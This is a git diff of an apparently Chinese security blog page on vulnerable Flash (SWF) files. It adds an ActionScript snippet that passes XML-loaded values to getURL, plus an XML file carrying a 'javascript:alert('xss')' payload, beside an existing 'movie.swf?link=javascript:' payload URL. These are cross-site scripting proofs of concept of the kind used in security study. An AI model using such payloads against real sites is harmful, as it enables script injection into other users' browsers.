@@ -92,7 +92,7 @@ Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive
 <meta property="og:site_name" content="xl7dev">
 <meta property="og:description" content="SWFIntruderhttps://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro
 Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive&amp;gt; cd Flashbang/shumway&amp;gt; git submodule">
-<meta property="og:updated_time" content="2016-06-30T17:27:58.000Z">
+<meta property="og:updated_time" content="2016-09-06T10:50:07.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Flash files Vulnerable Payload">
 <meta name="twitter:description" content="SWFIntruderhttps://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro
@@ -322,6 +322,8 @@ Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive
 <p>example</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/movie.swf?link=javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var root_xml:XML = new XML();</span><br><span class="line">root_xml.ignoreWhite = true;</span><br><span class="line">root_xml.onLoad = function(success)&#123;</span><br><span class="line">    if(success)&#123;</span><br><span class="line">        getURL(root_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        getURL(&quot;javascript:alert(‘fail’)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">root_xml.load(_root.url);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">    &lt;link&gt;javascript:alert(&apos;xss&apos;)&lt;/link&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>
 <h5 id="2-ExternalInterface-call"><a href="#2-ExternalInterface-call" class="headerlink" title="2) ExternalInterface.call"></a>2) ExternalInterface.call</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123; __Flash__toXML(函数名(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>example</p>
@@ -545,7 +547,7 @@ Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">51</span>
+              <span class="site-state-item-count">58</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -555,7 +557,7 @@ Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-count">49</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
